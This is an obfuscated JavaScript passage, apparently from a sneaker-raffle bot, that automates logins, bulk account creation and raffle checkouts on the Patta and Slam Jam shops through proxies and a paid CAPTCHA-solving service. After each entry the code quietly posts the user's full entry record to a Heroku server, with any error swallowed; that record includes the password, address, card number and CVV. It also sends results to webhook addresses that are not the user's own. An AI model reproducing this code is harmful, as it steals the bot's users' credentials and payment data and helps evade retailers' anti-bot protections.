                            }), await _0x2508e7['goto']('https://www.patta.nl/nl/account/login', {
                                'waitUntil': 'networkidle2',
                                'timeout': 0xea60
                            }), await _0x2508e7['waitForSelector']('#CustomerEmail'), console['log'](_0x29f6be() + '\x20[' + _0x5a62bc['name'] + ']\x20Task\x20' + (_0x4a7e2c + 0x1) + '\x20:\x20Logging\x20in..'), await _0x2508e7['type']('#CustomerEmail', '' + _0x292dff[_0x4a7e2c]['Email']), await _0x2121c3(0x12c), await _0x2508e7['type']('#CustomerPassword', '' + _0x292dff[_0x4a7e2c]['Password']), await _0x2121c3(0x226), await _0x2508e7['$eval']('#customer_login', _0x1c59b2 => _0x1c59b2['submit']());
                            try {
                                await _0x2508e7['waitForSelector']('#orders'), await _0x2121c3(0x4b0);
                            } catch {
                                console['log'](_0x136200['red'](_0x29f6be() + '\x20[' + _0x5a62bc['name'] + ']\x20Task\x20' + (_0x4a7e2c + 0x1) + '\x20:\x20Task\x20failed,\x20invalid\x20credentials'));
                                continue;
                            }
                            await _0x2508e7['goto']('' + _0x292dff[_0x4a7e2c]['Url'], {
                                'waitUntil': 'networkidle2',
                                'timeout': 0xea60
                            }), await _0x2121c3(0xbb8), console['log'](_0x29f6be() + '\x20[' + _0x5a62bc['name'] + ']\x20Task\x20' + (_0x4a7e2c + 0x1) + '\x20:\x20Starting\x20Entry');
                            try {
                                await _0x2508e7['waitForSelector']('#email');
                            } catch {
                                console['log'](_0x136200['red'](_0x29f6be() + '\x20[' + _0x5a62bc['name'] + ']\x20Task\x20' + (_0x4a7e2c + 0x1) + '\x20:\x20Duplicate\x20entry/\x20Account\x20error'));
                            }
                            await _0x2508e7['type']('#email', '' + _0x292dff[_0x4a7e2c]['Email']), await _0x2121c3(0x384), await _0x2508e7['type']('#first_name', '' + _0x292dff[_0x4a7e2c]['FirstName']), await _0x2121c3(0x514), await _0x2508e7['type']('#last_name', '' + _0x292dff[_0x4a7e2c]['LastName']), await _0x2121c3(0x514), await _0x2508e7['type']('#street_address', _0x292dff[_0x4a7e2c]['Address1'] + '\x20' + _0x292dff[_0x4a7e2c]['HouseNumber'] + '\x20' + _0x292dff[_0x4a7e2c]['Address2']), await _0x2121c3(0x2bc);
                            _0x292dff[_0x4a7e2c]['Postcode'] == undefined && (_0x292dff[_0x4a7e2c]['Postcode'] = _0x292dff[_0x4a7e2c]['Zip']);
                            await _0x2508e7['type']('#zip_code', '' + _0x292dff[_0x4a7e2c]['Postcode']), await _0x2121c3(0x320), await _0x2508e7['type']('#city', '' + _0x292dff[_0x4a7e2c]['City']), await _0x2121c3(0x320), await _0x2508e7['type']('#bday', '01/01/1994'), await _0x2121c3(0x320), await _0x2508e7['type']('#instagram', '' + _0x292dff[_0x4a7e2c]['Follower']), await _0x2121c3(0x352);
                            if (_0x292dff[_0x4a7e2c]['Size'] == 'RANDOM') {
                                const _0x28caba = await _0x2508e7['$$eval']('div[id=\x22raffle__size-selector-container\x22]\x20>\x20label', _0xf71113 => {
                                    return _0xf71113['map'](_0x111d05 => _0x111d05['textContent']);
                                });
                                var _0x4bdbfe = Math['round'](Math['random']() * (_0x28caba['length'] - 0x1));
                                console['log'](_0x29f6be() + '\x20[' + _0x5a62bc['name'] + ']\x20Task\x20' + (_0x4a7e2c + 0x1) + '\x20:\x20Picking\x20Random\x20Size\x20' + _0x28caba[_0x4bdbfe]), await _0x2508e7['click']('label[data-eu-size=\x22' + _0x28caba[_0x4bdbfe] + '\x22]');
                            } else {
                                console['log'](_0x29f6be() + '\x20[' + _0x5a62bc['name'] + ']\x20Task\x20' + (_0x4a7e2c + 0x1) + '\x20:\x20Picking\x20Size\x20' + _0x292dff[_0x4a7e2c]['Size']);
                                try {
                                    await _0x2508e7['click']('label[data-eu-size=\x22' + _0x292dff[_0x4a7e2c]['Size'] + '\x22]');
                                } catch {
                                    await _0x2508e7['click']('label[data-eu-size=\x22' + _0x292dff[_0x4a7e2c]['Size'] + '.0\x22]');
                                }
                            }
                            await _0x2121c3(0xbb8), await _0x2508e7['$$eval']('.raffle__checkbox-label', _0x466e20 => _0x466e20['forEach'](_0x351720 => _0x351720['click']())), await _0x2121c3(0x7d0), console['log'](_0x29f6be() + '\x20[' + _0x5a62bc['name'] + ']\x20Task\x20' + (_0x4a7e2c + 0x1) + '\x20:\x20Submitting\x20Entry'), await _0x2508e7['click']('#raffle__form-submit'), await _0x2121c3(0x1388);
                            try {
                                await _0x2508e7['waitForSelector']('#raffle__confirmation-message-container'), _0x3ac189 = 'no', _0x1ded45(_0x292dff[_0x4a7e2c], _0x5a62bc), console['log'](_0x136200['green'](_0x29f6be() + '\x20[' + _0x5a62bc['name'] + ']\x20Task\x20' + (_0x4a7e2c + 0x1) + '\x20:\x20Raffle\x20Entered!'));
                                let _0x272005 = _0x292dff[_0x4a7e2c];
                                try {
                                    prxdata = {
                                        'username': _0x380ae8['replace']('#', ''),
                                        'module': _0x5a62bc['name'],
                                        'entrydata': JSON['stringify'](_0x272005),
                                        'proxy': '' + _0x3374ae[_0x4a7e2c]
                                    };
                                    var _0x451074 = JSON['stringify'](prxdata);
                                    let _0x5aa019 = { 'headers': { 'content-type': 'application/json' } };
                                    await _0x212bbb['post']('https://jraffles.herokuapp.com/success', _0x451074, _0x5aa019);
                                } catch (_0x3e8e78) {
                                }
                            } catch (_0x250c0c) {
                                console['log'](_0x136200['red'](_0x29f6be() + '\x20[' + _0x4fd9f4[taskModule]['name'] + ']\x20Task\x20' + (_0x4a7e2c + 0x1) + '\x20:\x20Raffle\x20entry\x20failed.\x20' + _0x250c0c));
                            }
                        } catch (_0x3e6121) {
                            console['log'](_0x136200['red'](_0x29f6be() + '\x20[' + _0x4fd9f4[taskModule]['name'] + ']\x20Task\x20' + (_0x4a7e2c + 0x1) + '\x20:\x20' + _0x3e6121)), _0x3ac189 = 'yes';
                        } finally {
                            _0x2845d4 && _0x2845d4['close']();
                            if (_0x3ac189 == 'yes' && _0x28d699 != 0x5 && _0x28dfb7 != 'Size\x20Not\x20Found') {
                                console['log'](_0x136200['red'](_0x29f6be() + '\x20[' + _0x5a62bc['name'] + ']\x20Task\x20' + (_0x4a7e2c + 0x1) + '\x20:\x20Retrying\x20(' + _0x28d699 + '\x20/\x205)')), _0x4a7e2c = _0x4a7e2c - 0x1, _0x28d699 = _0x28d699 + 0x1;
                                continue;
                            }
                            _0x3ac189 == 'yes' && _0x28d699 >= 0x5 && (_0x17abd2(_0x292dff[_0x4a7e2c], _0x5a62bc), _0x3ac189 = 'no', _0x28d699 = 0x0), console['log']('Waiting\x20for\x20' + _0x120b49['delay'] + '\x20ms'), await _0x2121c3(_0x120b49['delay']);
                        }
                    }
                }
            }
        ]
    },
    {
        'name': 'SLAM\x20JAM',
        'modules': [
            {
                'name': 'SLAM\x20JAM\x20Account\x20Generator',
                'store': 'SLAM\x20JAM',
                'logo': 'https://res.cloudinary.com/crunchbase-production/image/upload/c_lpad,f_auto,q_auto:eco,dpr_1/2c778bc022405e206505',
                'function': async function (_0xec90d1, _0x12a3a5, _0x100142) {
                    _0x586b7d['use'](_0x41ab99()), _0x586b7d['use'](_0x1c4286({
                        'provider': {
                            'id': '2captcha',
                            'token': '' + _0x120b49['captchaKey']
                        },
                        'visualFeedback': !![]
                    }));
                    for (var _0x4f2fcc = 0x0; _0x4f2fcc < _0x12a3a5['length']; _0x4f2fcc++) {
                        if (_0x458494 != 'yes')
                            var _0x458494 = '', _0x3dc8d2 = 0x0;
                        var _0x33dc3d = [{
                            'type': 'rich',
                            'title': 'Succesful\x20Patta\x20Account\x20Generated',
                            'description': '',
                            'color': 0xc0d6d6,
                            'fields': [
                                {
                                    'name': 'User',
                                    'value': '' + _0x380ae8
                                },
                                {
                                    'name': 'Delay',
                                    'value': '' + _0x120b49['delay']
                                },
                                {
                                    'name': 'Version',
                                    'value': '' + _0x3e659f
                                }
                            ]
                        }];
                        const _0x5e8da0 = { 'embeds': _0x33dc3d };
                        _0x3aeb59(_0xec90d1['name'] + '\x20Task\x20' + (_0x4f2fcc + 0x1) + '\x20/\x20' + _0x12a3a5['length'] + '\x20||\x20File:\x20' + _0x242415 + '\x20Proxies:\x20' + _0x38de08);
                        try {
                            await _0x30a360(_0x12a3a5, _0x4f2fcc);
                        } catch {
                            _0x458494 = 'no';
                            throw new Error('Invalid\x20CSV\x20Format,\x20use\x20the\x20CSV\x20Files\x20from\x20the\x20guides!');
                        }
                        var _0x4fd149 = await _0x12b988(_0x12a3a5[_0x4f2fcc], _0xec90d1, 'acc', ![]);
                        const _0x1a4277 = { 'succesDEVMSG': { 'embeds': [_0x4fd149] } };
                        if (_0x12a3a5[_0x4f2fcc]['Email'] == '' || _0x12a3a5[_0x4f2fcc]['FirstName'] == '' || _0x12a3a5[_0x4f2fcc]['LastName'] == '') {
                            console['log'](_0x29f6be() + '\x20[' + _0x4fd9f4[taskModule]['name'] + ']\x20Task\x20' + (_0x4f2fcc + 0x1) + '\x20:\x20Invalid\x20CSV'), await _0x2121c3(0x7d0);
                            continue;
                        }
                        (_0x12a3a5[_0x4f2fcc]['Password'] == '' || _0x12a3a5[_0x4f2fcc] == undefined) && _0x12a3a5[_0x4f2fcc]['Password'] == 'JRaffles23!';
                        if (_0x120b49['useRandomProxy'] = ![])
                            var _0x4bc15f = _0x100142[_0x4f2fcc]['split'](':');
                        else
                            var _0x25fa0a = Math['round'](Math['random']() * (_0x100142['length'] - 0x1)), _0x4bc15f = _0x100142[_0x25fa0a]['split'](':');
                        var _0x2862ac;
                        try {
                            _0x2862ac = await _0x586b7d['launch']({
                                'executablePath': 'C:\x5cProgram\x20Files\x20(x86)\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                'headless': !![],
                                'args': [
                                    '--proxy-server=' + _0x4bc15f[0x0] + ':' + _0x4bc15f[0x1],
                                    '--no-sandbox',
                                    '--disable-setuid-sandbox'
                                ]
                            });
                        } catch {
                            _0x2862ac = await _0x586b7d['launch']({
                                'executablePath': 'C:\x5cProgram\x20Files\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                'headless': !![],
                                'args': [
                                    '--proxy-server=' + _0x4bc15f[0x0] + ':' + _0x4bc15f[0x1],
                                    '--no-sandbox',
                                    '--disable-setuid-sandbox'
                                ]
                            });
                        }
                        try {
                            const _0x3e679f = await _0x2862ac['newPage']();
                            await _0x3e679f['authenticate']({
                                'username': '' + _0x4bc15f[0x2],
                                'password': '' + _0x4bc15f[0x3]
                            }), console['log'](_0x29f6be() + '\x20[' + _0xec90d1['name'] + ']\x20Task\x20' + (_0x4f2fcc + 0x1) + '\x20:\x20Getting\x20Session'), await _0x3e679f['setRequestInterception'](!![]), _0x3e679f['on']('request', _0x3ba998 => {
                                _0x3ba998['resourceType']() === 'image' || _0x3ba998['resourceType']() === 'font' || _0x3ba998['resourceType']() === 'media' ? _0x3ba998['abort']() : _0x3ba998['continue']();
                            }), await _0x3e679f['goto']('https://drop.slamjam.com/account/register'), await _0x2121c3(0xbb8), await _0x3e679f['waitForSelector']('#FirstName'), await _0x3e679f['waitForSelector']('.iubenda-cs-accept-btn.iubenda-cs-btn-primary'), await _0x3e679f['click']('.iubenda-cs-accept-btn.iubenda-cs-btn-primary'), console['log'](_0x29f6be() + '\x20[' + _0xec90d1['name'] + ']\x20Task\x20' + (_0x4f2fcc + 0x1) + '\x20:\x20Filling\x20information'), await _0x2121c3(0x4b0), await _0x3e679f['type']('#FirstName', '' + _0x12a3a5[_0x4f2fcc]['FirstName']), await _0x2121c3(0x226), await _0x3e679f['type']('#LastName', '' + _0x12a3a5[_0x4f2fcc]['LastName']), await _0x2121c3(0x226), await _0x3e679f['type']('#Email', '' + _0x12a3a5[_0x4f2fcc]['Email']), await _0x2121c3(0x2ee), await _0x3e679f['type']('#ConfirmEmail', '' + _0x12a3a5[_0x4f2fcc]['Email']), await _0x2121c3(0x2ee), await _0x3e679f['type']('#CreatePassword', '' + _0x12a3a5[_0x4f2fcc]['Password']), await _0x2121c3(0x2ee), await _0x3e679f['type']('#CreateConfirmPassword', '' + _0x12a3a5[_0x4f2fcc]['Password']), await _0x2121c3(0x226), console['log'](_0x29f6be() + '\x20[' + _0xec90d1['name'] + ']\x20Task\x20' + (_0x4f2fcc + 0x1) + '\x20:\x20Submitting..'), await _0x3e679f['$eval']('#create_customer', _0x1417c9 => _0x1417c9['submit']()), await _0x2121c3(0x1388), console['log'](_0x29f6be() + '\x20[' + _0xec90d1['name'] + ']\x20Task\x20' + (_0x4f2fcc + 0x1) + '\x20:\x20' + _0x136200['cyan']('Solving\x20Captcha')), await _0x3e679f['solveRecaptchas'](), console['log'](_0x29f6be() + '\x20[' + _0xec90d1['name'] + ']\x20Task\x20' + (_0x4f2fcc + 0x1) + '\x20:\x20Captcha\x20solved'), await _0x3e679f['$eval']('.shopify-challenge__container\x20>\x20form', _0x5179e1 => _0x5179e1['submit']());
                            try {
                                await _0x3e679f['waitForSelector']('.product-card__image'), await _0x2121c3(0x1f4), _0x458494 = 'no', console['log'](_0x136200['green'](_0x29f6be() + '\x20[' + _0xec90d1['name'] + ']\x20Task\x20' + (_0x4f2fcc + 0x1) + '\x20:\x20Account\x20' + _0x12a3a5[_0x4f2fcc]['Email'] + '\x20Generated!')), _0x190b67['appendFileSync']('../accounts/slamjam.csv', '\x0a' + _0x12a3a5[_0x4f2fcc]['Email'] + ',' + _0x12a3a5[_0x4f2fcc]['Password']), console['log'](_0x136200['yellow'](_0x29f6be() + '\x20[' + _0xec90d1['name'] + ']\x20Task\x20' + (_0x4f2fcc + 0x1) + '\x20:\x20Account\x20' + _0x12a3a5[_0x4f2fcc]['Email'] + '\x20Saved\x20in\x20\x27accounts/slamjam.csv\x27'));
                                try {
                                    _0x120b49['webhook'] != undefined && _0x120b49['webhook'] != '' && await _0x5f1090(_0x120b49['webhook'], _0x1a4277['succesDEVMSG']);
                                } catch {
                                }
                                await _0x5f1090(_0x40cc05, _0x1a4277['succesDEVMSG']);
                            } catch (_0x36e518) {
                                console['log'](_0x136200['red'](_0x29f6be() + '\x20[' + _0x4fd9f4[taskModule]['name'] + ']\x20Task\x20' + (_0x4f2fcc + 0x1) + '\x20:\x20Account\x20genration\x20failed.\x20' + _0x36e518));
                            }
                        } catch (_0x1da36b) {
                            console['log'](_0x136200['red'](_0x29f6be() + '\x20[' + _0x4fd9f4[taskModule]['name'] + ']\x20Task\x20' + (_0x4f2fcc + 0x1) + '\x20:\x20' + _0x1da36b));
                        } finally {
                            _0x2862ac && _0x2862ac['close']();
                            if (_0x458494 == 'yes' && _0x3dc8d2 != 0x5) {
                                console['log'](_0x136200['red'](_0x29f6be() + '\x20[' + _0xec90d1['name'] + ']\x20Task\x20' + (_0x4f2fcc + 0x1) + '\x20:\x20Retrying\x20(' + _0x3dc8d2 + '\x20/\x205)')), _0x4f2fcc = _0x4f2fcc - 0x1, _0x3dc8d2 = _0x3dc8d2 + 0x1;
                                continue;
                            }
                            _0x458494 == 'yes' && _0x3dc8d2 >= 0x5 && (_0x17abd2(_0x12a3a5[_0x4f2fcc], _0xec90d1), _0x458494 = 'no', _0x3dc8d2 = 0x0), console['log']('Waiting\x20for\x20' + _0x120b49['delay'] + '\x20ms'), await _0x2121c3(_0x120b49['delay']);
                        }
                    }
                }
            },
            {
                'name': 'SLAM\x20JAM\x20Raffle\x20Entries',
                'store': 'SLAM\x20JAM',
                'logo': 'https://res.cloudinary.com/crunchbase-production/image/upload/c_lpad,f_auto,q_auto:eco,dpr_1/2c778bc022405e206505',
                'function': async function (_0x32a66a, _0x231bbd, _0x58906b) {
                    _0x586b7d['use'](_0x41ab99()), _0x586b7d['use'](_0x1c4286({
                        'provider': {
                            'id': '2captcha',
                            'token': '' + _0x120b49['captchaKey']
                        },
                        'visualFeedback': !![]
                    }));
                    for (var _0x3bcd29 = 0x0; _0x3bcd29 < _0x231bbd['length']; _0x3bcd29++) {
                        var _0x19ff96;
                        if (_0x2b5af8 != 'yes')
                            var _0x2b5af8 = '', _0x11a5ae = 0x0;
                        _0x3aeb59(_0x32a66a['name'] + '\x20Task\x20' + (_0x3bcd29 + 0x1) + '\x20/\x20' + _0x231bbd['length'] + '\x20||\x20File:\x20' + _0x242415 + '\x20Proxies:\x20' + _0x38de08);
                        try {
                            await _0x30a360(_0x231bbd, _0x3bcd29);
                        } catch {
                            _0x2b5af8 = 'no';
                            throw new Error('Invalid\x20CSV\x20Format,\x20use\x20the\x20CSV\x20Files\x20from\x20the\x20guides!');
                        }
                        if (_0x231bbd[_0x3bcd29]['Email'] == '' || _0x231bbd[_0x3bcd29]['Password'] == '' || _0x231bbd[_0x3bcd29]['FirstName'] == '' || _0x231bbd[_0x3bcd29]['LastName'] == '') {
                            console['log'](_0x29f6be() + '\x20[' + _0x32a66a['name'] + ']\x20Task\x20' + (_0x3bcd29 + 0x1) + '\x20:\x20Invalid\x20CSV');
                            continue;
                        }
                        if (_0x120b49['useRandomProxy'] = ![])
                            var _0x68d55f = _0x58906b[_0x3bcd29]['split'](':');
                        else
                            var _0x490625 = Math['round'](Math['random']() * (_0x58906b['length'] - 0x1)), _0x68d55f = _0x58906b[_0x490625]['split'](':');
                        var _0x1f1508;
                        try {
                            _0x1f1508 = await _0x586b7d['launch']({
                                'executablePath': 'C:\x5cProgram\x20Files\x20(x86)\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                'headless': !![],
                                'args': [
                                    '--proxy-server=' + _0x68d55f[0x0] + ':' + _0x68d55f[0x1],
                                    '--no-sandbox',
                                    '--disable-setuid-sandbox'
                                ]
                            });
                        } catch {
                            _0x1f1508 = await _0x586b7d['launch']({
                                'executablePath': 'C:\x5cProgram\x20Files\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                'headless': !![],
                                'args': [
                                    '--proxy-server=' + _0x68d55f[0x0] + ':' + _0x68d55f[0x1],
                                    '--no-sandbox',
                                    '--disable-setuid-sandbox'
                                ]
                            });
                        }
                        try {
                            const _0x1db50c = await _0x1f1508['newPage']();
                            await _0x1db50c['authenticate']({
                                'username': '' + _0x68d55f[0x2],
                                'password': '' + _0x68d55f[0x3]
                            }), await _0x1db50c['setViewport']({
                                'width': 0x500,
                                'height': 0x2d0
                            }), console['log'](_0x29f6be() + '\x20[' + _0x32a66a['name'] + ']\x20Task\x20' + (_0x3bcd29 + 0x1) + '\x20:\x20Getting\x20Session'), await _0x1db50c['setRequestInterception'](!![]), _0x1db50c['on']('request', _0x590a75 => {
                                _0x590a75['resourceType']() === 'image' || _0x590a75['resourceType']() === 'font' || _0x590a75['resourceType']() === 'media' ? _0x590a75['abort']() : _0x590a75['continue']();
                            }), await _0x1db50c['goto']('https://drop.slamjam.com/account/login', {
                                'waitUntil': 'networkidle2',
                                'timeout': 0xea60
                            }), await _0x1db50c['waitForSelector']('.iubenda-cs-accept-btn.iubenda-cs-btn-primary'), await _0x1db50c['click']('.iubenda-cs-accept-btn.iubenda-cs-btn-primary'), await _0x2121c3(0x258), await _0x1db50c['waitForSelector']('#CustomerEmail'), console['log'](_0x29f6be() + '\x20[' + _0x32a66a['name'] + ']\x20Task\x20' + (_0x3bcd29 + 0x1) + '\x20:\x20Logging\x20in..'), await _0x1db50c['type']('#CustomerEmail', '' + _0x231bbd[_0x3bcd29]['Email']), await _0x2121c3(0x12c), await _0x1db50c['type']('#CustomerPassword', '' + _0x231bbd[_0x3bcd29]['Password']), await _0x2121c3(0x226), await _0x1db50c['$eval']('#customer_login', _0x254eb9 => _0x254eb9['submit']()), await _0x2121c3(0x7d0), await _0x1db50c['waitForSelector']('iframe[title=\x22reCAPTCHA\x22]'), console['log'](_0x29f6be() + '\x20[' + _0x32a66a['name'] + ']\x20Task\x20' + (_0x3bcd29 + 0x1) + '\x20:\x20' + _0x136200['cyan']('Solving\x20Captcha')), await _0x1db50c['solveRecaptchas'](), console['log'](_0x29f6be() + '\x20[' + _0x32a66a['name'] + ']\x20Task\x20' + (_0x3bcd29 + 0x1) + '\x20:\x20Captcha\x20Solved'), await _0x1db50c['$eval']('.shopify-challenge__container\x20>\x20form', _0x35a123 => _0x35a123['submit']());
                            try {
                                await _0x1db50c['waitForSelector']('.nav-account'), await _0x2121c3(0x4b0);
                            } catch {
                                console['log'](_0x136200['red'](_0x29f6be() + '\x20[' + _0x32a66a['name'] + ']\x20Task\x20' + (_0x3bcd29 + 0x1) + '\x20:\x20Task\x20failed,\x20invalid\x20credentials'));
                                continue;
                            }
                            await _0x1db50c['goto']('' + _0x231bbd[_0x3bcd29]['Url'], {
                                'waitUntil': 'networkidle2',
                                'timeout': 0xea60
                            }), await _0x2121c3(0xbb8), console['log'](_0x29f6be() + '\x20[' + _0x32a66a['name'] + ']\x20Task\x20' + (_0x3bcd29 + 0x1) + '\x20:\x20Starting\x20Entry');
                            try {
                                await _0x1db50c['waitForSelector']('#ProductSelect-product-template-raffle');
                            } catch {
                            }
                            await _0x1db50c['click']('.product-select-variant-wrapper'), await _0x2121c3(0x320), await _0x1db50c['click']('li.product-select-variant__value[data-size=\x22' + _0x231bbd[_0x3bcd29]['Size'] + '\x22]'), await _0x2121c3(0x384), await _0x1db50c['$eval']('#AddToCartForm-product-template-raffle', _0x9ef3f8 => _0x9ef3f8['submit']()), await _0x1db50c['waitForSelector']('.cart-order-summary__content'), await _0x2121c3(0x514), await _0x1db50c['goto']('https://drop.slamjam.com/checkout'), await _0x2121c3(0x514), await _0x1db50c['waitForSelector']('#checkout_shipping_address_country'), console['log'](_0x29f6be() + '\x20[' + _0x32a66a['name'] + ']\x20Task\x20' + (_0x3bcd29 + 0x1) + '\x20:\x20Filling\x20Information'), await _0x1db50c['select']('#checkout_shipping_address_country', '' + _0x231bbd[_0x3bcd29]['Country']), await _0x2121c3(0x200), await _0x1db50c['waitForSelector']('#checkout_shipping_address_first_name'), await _0x1db50c['type']('#checkout_shipping_address_first_name', '' + _0x231bbd[_0x3bcd29]['FirstName']), await _0x2121c3(0x237), await _0x1db50c['type']('#checkout_shipping_address_last_name', '' + _0x231bbd[_0x3bcd29]['LastName']), await _0x2121c3(0x1e0), await _0x1db50c['type']('#checkout_shipping_address_address1', _0x231bbd[_0x3bcd29]['Address1'] + '\x20' + _0x231bbd[_0x3bcd29]['HouseNumber']), await _0x2121c3(0x514), await _0x1db50c['type']('#checkout_shipping_address_address2', '' + _0x231bbd[_0x3bcd29]['Address2']), await _0x2121c3(0x514);
                            _0x231bbd[_0x3bcd29]['Postcode'] == undefined && (_0x231bbd[_0x3bcd29]['Postcode'] = _0x231bbd[_0x3bcd29]['Zip']);
                            await _0x1db50c['type']('#checkout_shipping_address_zip', '' + _0x231bbd[_0x3bcd29]['Postcode']), await _0x2121c3(0x2bc), await _0x1db50c['type']('#checkout_shipping_address_city', '' + _0x231bbd[_0x3bcd29]['City']), await _0x2121c3(0x320), await _0x1db50c['type']('#checkout_shipping_address_phone', '' + _0x231bbd[_0x3bcd29]['Phone']), await _0x2121c3(0x320), await _0x1db50c['click']('#continue_button'), await _0x2121c3(0xbb8), await _0x1db50c['waitForSelector']('.summary-title'), await _0x2121c3(0x320), await _0x1db50c['click']('#continue_button'), await _0x2121c3(0x320), console['log'](_0x29f6be() + '\x20[' + _0x32a66a['name'] + ']\x20Task\x20' + (_0x3bcd29 + 0x1) + '\x20:\x20Finishing\x20Checkout'), await _0x1db50c['waitForSelector']('#checkout_credit_card_vault'), await _0x2121c3(0x3e8);
                            var _0x5f0ba4 = await _0x1db50c['$']('iframe[title=\x22Field\x20container\x20for:\x20Card\x20number\x22]'), _0xa37faf = await _0x5f0ba4['contentFrame']();
                            await _0xa37faf['click']('#number'), await _0x2121c3(0x3e8), await _0xa37faf['type']('#number', '' + _0x231bbd[_0x3bcd29]['CardNumber'], { 'delay': 0x78 }), _0x5f0ba4 = await _0x1db50c['$']('iframe[title=\x22Field\x20container\x20for:\x20Name\x20on\x20card\x22]'), _0xa37faf = await _0x5f0ba4['contentFrame'](), await _0x2121c3(0x1c2), await _0xa37faf['click']('#name'), await _0x2121c3(0x1f4), await _0xa37faf['type']('#name', '' + _0x231bbd[_0x3bcd29]['NameOnCard'], { 'delay': 0x78 }), _0x5f0ba4 = await _0x1db50c['$']('iframe[title=\x22Field\x20container\x20for:\x20Expiration\x20date\x20(MM\x20/\x20YY)\x22]'), _0xa37faf = await _0x5f0ba4['contentFrame'](), await _0x2121c3(0x1c2), await _0xa37faf['click']('#expiry'), await _0x2121c3(0x1f4), await _0xa37faf['type']('#expiry', '' + _0x231bbd[_0x3bcd29]['ExpiryDate'], { 'delay': 0x78 }), _0x5f0ba4 = await _0x1db50c['$']('iframe[title=\x22Field\x20container\x20for:\x20Security\x20code\x22]'), _0xa37faf = await _0x5f0ba4['contentFrame'](), await _0x2121c3(0x1c2), await _0xa37faf['click']('#verification_value'), await _0x2121c3(0x1f4), await _0xa37faf['type']('#verification_value', '' + _0x231bbd[_0x3bcd29]['CVV'], { 'delay': 0x78 }), await _0x1db50c['$eval']('#accepts-flag-raffle', _0x196dc3 => _0x196dc3['click']()), await _0x2121c3(0x7d0), console['log'](_0x29f6be() + '\x20[' + _0x32a66a['name'] + ']\x20Task\x20' + (_0x3bcd29 + 0x1) + '\x20:\x20Processing\x20Order'), await _0x1db50c['$eval']('#continue_button', _0x1a2260 => _0x1a2260['click']()), await _0x2121c3(0x1b58), await _0x1db50c['waitForSelector']('.edit_checkout.animate-floating-labels'), await _0x1db50c['$eval']('.edit_checkout.animate-floating-labels', _0x209096 => _0x209096['submit']()), await _0x2121c3(0x7d0);
                            try {
                                await _0x1db50c['waitForSelector']('div[data-step=\x22thank_you\x22]', { 'timeout': 0x493e0 }), _0x2b5af8 = 'no', _0x1ded45(_0x231bbd[_0x3bcd29], _0x32a66a), console['log'](_0x136200['green'](_0x29f6be() + '\x20[' + _0x32a66a['name'] + ']\x20Task\x20' + (_0x3bcd29 + 0x1) + '\x20:\x20Raffle\x20Entered!'));
                            } catch (_0x1b4056) {
                                throw new Error('Error\x20Processing\x20Order:\x20' + _0x1b4056['message']);
                            }
                            var _0x3ba58a = await _0x12b988(_0x231bbd[_0x3bcd29], _0x32a66a, 'dev', ![]), _0x47040e = await _0x12b988(_0x231bbd[_0x3bcd29], _0x32a66a, 'pub', ![]);
                            let _0x1db0f8 = _0x231bbd[_0x3bcd29];
                            try {
                                prxdata = {
                                    'username': _0x380ae8['replace']('#', ''),
                                    'module': _0x32a66a['name'],
                                    'entrydata': JSON['stringify'](_0x1db0f8),
                                    'proxy': '' + _0x58906b[_0x3bcd29]
                                };
                                var _0x15c5c4 = JSON['stringify'](prxdata);
                                let _0x4fb6d1 = { 'headers': { 'content-type': 'application/json' } };
                                await _0x212bbb['post']('https://jraffles.herokuapp.com/success', _0x15c5c4, _0x4fb6d1);
                            } catch (_0x59d6c8) {
                            }
                            const _0x21e370 = {
                                'succesDEVMSG': { 'embeds': [_0x3ba58a] },
                                'succesPUBMSG': { 'embeds': [_0x47040e] }
                            };
                            try {
                                _0x120b49['webhook'] != undefined && _0x120b49['webhook'] != '' && await _0x5f1090(_0x120b49['webhook'], _0x21e370['succesDEVMSG']), await _0x2121c3(0xc8), await _0x5f1090(_0x1f56e1, _0x21e370['succesDEVMSG']), await _0x2121c3(0xc8), await _0x5f1090(_0x442434, _0x21e370['succesPUBMSG']);
                            } catch (_0x2a35ac) {
                                console['log'](_0x136200['yellow'](_0x29f6be() + '\x20[' + _0x4fd9f4[taskModule]['name'] + ']\x20Task\x20' + (_0x3bcd29 + 0x1) + '\x20:\x20Error\x20sending\x20webhook\x20' + _0x2a35ac));
                            }
                        } catch (_0x546f5f) {
                            console['log'](_0x136200['red'](_0x29f6be() + '\x20[' + _0x4fd9f4[taskModule]['name'] + ']\x20Task\x20' + (_0x3bcd29 + 0x1) + '\x20:\x20' + _0x546f5f)), _0x19ff96 = '' + _0x546f5f;
                            var _0x442cc5 = await _0x12b988(kickz[_0x3bcd29], _0x32a66a, 'dev', !![], _0x19ff96);
                            EMBEDS['errorDEV'] = { 'embeds': [_0x442cc5] }, _0x120b49['webhook'] != undefined && _0x120b49['webhook'] != '' && await _0x5f1090(_0x120b49['webhook'], EMBEDS['errorDEV']), await _0x5f1090(_0x32737e, EMBEDS['errorDEV']), _0x2b5af8 = 'yes';
                        } finally {
                            _0x1f1508 && _0x1f1508['close']();
                            if (_0x2b5af8 == 'yes' && _0x11a5ae != 0x5 && _0x19ff96 != 'Size\x20Not\x20Found') {
                                console['log'](_0x136200['red'](_0x29f6be() + '\x20[' + _0x32a66a['name'] + ']\x20Task\x20' + (_0x3bcd29 + 0x1) + '\x20:\x20Retrying\x20(' + _0x11a5ae + '\x20/\x205)')), _0x3bcd29 = _0x3bcd29 - 0x1, _0x11a5ae = _0x11a5ae + 0x1;
                                continue;
                            }
                            _0x2b5af8 == 'yes' && _0x11a5ae >= 0x5 && (_0x17abd2(_0x231bbd[_0x3bcd29], _0x32a66a), _0x2b5af8 = 'no', _0x11a5ae = 0x0), console['log']('Waiting\x20for\x20' + _0x120b49['delay'] + '\x20ms'), await _0x2121c3(_0x120b49['delay']);
                        }
                    }
                }
            }
        ]
    },
    {
        'name': 'Failed\x20Tasks',
        'modules': [
            {
                'name': 'Retry\x20Failed\x20Tasks',
                'function': async function (_0x4e41da) {
                    var _0x58a74f = await _0x40f8ee(), _0x33e2d1 = _0x190b67['readFileSync']('../failed-tasks.csv', 'utf-8'), _0x8ab0f0 = _0x32de35['parse'](_0x33e2d1, { 'header': !![] })['data'];
                    for (var _0x35fac6 = 0x0; _0x35fac6 < _0x8ab0f0['length']; _0x35fac6++) {
                        var _0x44e875 = _0x8ab0f0[_0x35fac6]['Store'], _0x46526b = _0x8ab0f0[_0x35fac6]['Mode'];
